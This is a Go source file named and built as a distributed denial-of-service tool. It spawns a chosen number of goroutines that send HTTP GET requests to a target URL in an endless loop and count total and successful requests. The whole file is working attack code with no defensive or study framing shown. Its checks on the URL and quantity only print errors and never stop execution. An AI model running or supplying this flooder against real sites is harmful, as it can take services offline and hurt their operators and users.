package ddos

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
)

type Ddos struct {
	url             string
	stop            *chan bool
	quantity        int
	amountRequests  int64
	successRequests int64
}

func CreateDDOS(URL string, quantity int) (*Ddos, error) {
	if quantity < 1 {
		fmt.Println("Quantity cannot be less than 1! Quantity: ", quantity)
	}

	u, err := url.Parse(URL)

	if err != nil || len(u.Host) == 0 {
		fmt.Println("Error parsing the url or Host is undefined. Error: ", err)
	}

	s := make(chan bool)

	return &Ddos{url: URL, stop: &s, quantity: quantity}, nil
}

func (d *Ddos) Start() {
	for i := 0; i < d.quantity; i++ {
		go func() {
			for {
				select {
				case <-*d.stop:
					return
				default:
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)

					if err == nil {
						atomic.AddInt64(&d.successRequests, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						closeErr := resp.Body.Close()
						if closeErr != nil {
							fmt.Println("Error closing the response body: ", closeErr)
						}
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

func (d *Ddos) Stop(){
	for i := 0; i < d.quantity; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

func (d *Ddos) Results() (int64, int64){
	return d.amountRequests, d.successRequests
}